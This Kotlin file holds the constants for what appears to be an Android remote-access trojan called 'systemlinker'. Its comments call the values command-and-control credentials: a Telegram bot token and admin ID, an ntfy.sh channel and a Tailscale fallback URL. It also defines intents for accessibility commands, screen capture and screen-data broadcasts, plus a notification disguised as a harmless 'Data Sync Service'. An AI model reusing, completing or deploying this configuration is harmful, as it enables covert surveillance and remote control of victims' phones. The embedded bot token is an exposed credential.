package com.systemlinker.base

object Constants {

    /**
     * Core C2 communication credentials. These are the primary values you need to change.
     */
    object C2 {
        const val TELEGRAM_BOT_TOKEN = "7956541572:AAGmwemZeH4jStO8211x7jCXBmudQzNYPj8"
        const val TELEGRAM_ADMIN_USER_ID = 8108506175L

        // The public ntfy.sh server address.
        const val NTFY_PUBLIC_SERVER = "https://ntfy.sh"

        // The **initial, default** ntfy topic the app uses on first launch.
        // This can be updated later via a Telegram command.
        const val NTFY_DEFAULT_TOPIC = "sys_linker_initial_comm_channel_xyz789"

        // The **initial, default** Tailscale Funnel URL.
        // Keep this blank if you don't have one set up yet. Update later via Telegram.
        const val NTFY_DEFAULT_FALLBACK_URL = "" // e.g., "https://your-server.tailnet-id.ts.net"
    }

    /**
     * Keys used for the secure, encrypted SharedPreferences storage.
     */
    object Storage {
        const val PREFS_FILE_NAME = "sys_linker_sec_prefs"
        const val KEY_NTFY_TOPIC = "ntfy_topic"
        const val KEY_TS_URL = "ts_url"
        const val KEY_LAST_UPDATE_ID = "last_update_id"
    }

    /**
     * Identifiers for the Foreground Service and its Notification.
     */
    object Service {
        const val NOTIFICATION_CHANNEL_ID = "system_linker_sync_channel"
        const val NOTIFICATION_CHANNEL_NAME = "Data Sync Service"
        const val NOTIFICATION_TITLE = "System Linking"
        const val NOTIFICATION_TEXT = "Maintaining local state."
    }

    /**
     * Unique names for background tasks scheduled with WorkManager.
     */
    object WorkManager {
        const val DAILY_UPDATE_WORK_NAME = "sys_linker_daily_config_update"
    }

    /**
     * Action strings for internal communication between components using Broadcast Intents.
     */
    object Intents {
        const val ACTION_ACCESSIBILITY_COMMAND = "com.systemlinker.ACC_ACTION"
        const val ACTION_SCREEN_DATA_BROADCAST = "com.systemlinker.SCREEN_DATA"
        const val ACTION_SCREEN_CAST_CONSENT = "com.systemlinker.SCREEN_CAST_CONSENT"
        const val ACTION_SCREEN_CAST_CONSENT_DENIED = "com.systemlinker.SCREEN_CAST_CONSENT_DENIED"
        const val ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION = "com.systemlinker.UPGRADE_FGS_MP"
        const val ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION = "com.systemlinker.DOWNGRADE_FGS_MP"
    }
}